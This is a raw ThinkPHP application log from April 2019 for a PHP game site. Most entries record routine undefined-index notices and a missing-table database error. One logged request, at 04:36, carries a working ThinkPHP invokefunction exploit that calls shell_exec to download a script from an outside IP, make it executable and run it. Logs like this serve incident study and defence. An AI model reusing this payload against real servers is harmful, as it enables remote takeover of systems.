[ 2019-04-09T01:28:37+08:00 ] 54.174.233.49 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000244s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000294s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000332s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0021s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0017s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T02:03:47+08:00 ] 177.38.3.62 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000259s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000318s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000353s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0025s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0021s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T02:56:56+08:00 ] 217.73.137.75 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000330s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000368s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0016s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0013s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T03:49:42+08:00 ] 202.51.191.174 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000268s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000328s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000363s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0017s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0013s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T04:36:56+08:00 ] 139.224.18.42 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000231s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000299s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000331s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0023s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0019s ]
ERR: 非法操作:\think\app

[ 2019-04-09T05:58:33+08:00 ] 196.52.43.111 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000423s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000305s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000355s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0024s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0020s ]
NOTIC: [8] Undefined index: HTTP_HOST /phpstudy/www/Gittext/game/Application/Common/Util/ddwechat.class.php 第 1297 行.
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T07:26:22+08:00 ] 120.55.13.109 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000241s ]
NOTIC: [8] Undefined index: HTTP_USER_AGENT /phpstudy/www/Gittext/game/#DFrame/Library/Think/App.class.php 第 75 行.
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000385s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000425s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0036s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0032s ]
NOTIC: [8] Undefined index: HTTP_HOST /phpstudy/www/Gittext/game/Application/Common/Util/ddwechat.class.php 第 1297 行.
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T08:09:45+08:00 ] 200.196.38.151 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000251s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000345s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000390s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0032s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0029s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T08:25:54+08:00 ] 168.232.13.186 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000267s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000336s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000372s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0025s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0021s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T09:29:07+08:00 ] 47.94.52.159 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000224s ]
NOTIC: [8] Undefined index: HTTP_USER_AGENT /phpstudy/www/Gittext/game/#DFrame/Library/Think/App.class.php 第 75 行.
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000291s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000321s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0565s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0031s ]
NOTIC: [8] Undefined index: HTTP_HOST /phpstudy/www/Gittext/game/Application/Common/Util/ddwechat.class.php 第 1297 行.
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T10:39:57+08:00 ] 78.166.254.94 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000235s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000317s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000349s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0033s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0029s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T10:52:46+08:00 ] 134.175.190.207 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000240s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000290s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000322s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0035s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0031s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T11:01:19+08:00 ] 85.101.1.35 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000235s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000297s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000330s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0024s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0020s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T11:23:20+08:00 ] 201.95.139.86 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000231s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000295s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000329s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0025s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0022s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T11:42:30+08:00 ] 195.138.162.191 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000252s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000295s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000327s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0034s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0030s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T12:58:39+08:00 ] 45.125.156.146 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000252s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000307s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000346s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0017s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0014s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T15:29:41+08:00 ] 183.129.154.157 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000264s ]
NOTIC: [8] Undefined index: HTTP_USER_AGENT /phpstudy/www/Gittext/game/#DFrame/Library/Think/App.class.php 第 75 行.
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000305s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000345s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0024s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0020s ]
NOTIC: [8] Undefined index: HTTP_HOST /phpstudy/www/Gittext/game/Application/Common/Util/ddwechat.class.php 第 1297 行.
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T16:29:26+08:00 ] 101.251.242.238 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000222s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000293s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000325s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0025s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0022s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T17:47:59+08:00 ] 198.108.66.96 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000288s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000347s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000382s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0033s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0029s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T20:15:31+08:00 ] 191.205.49.217 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000250s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000300s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000336s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0017s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0015s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

[ 2019-04-09T20:26:59+08:00 ] 188.166.115.117 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000226s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000294s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000338s ]
NOTIC: [8] Undefined index: nuid /phpstudy/www/Gittext/game/Application/Home/Controller/HomeController.class.php 第 10 行.
SQL: SHOW COLUMNS FROM `dd_config` [ RunTime:0.0019s ]
SQL: SELECT * FROM `dd_config`  [ RunTime:0.0015s ]
ERR: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'test.dd_zhuan' doesn't exist

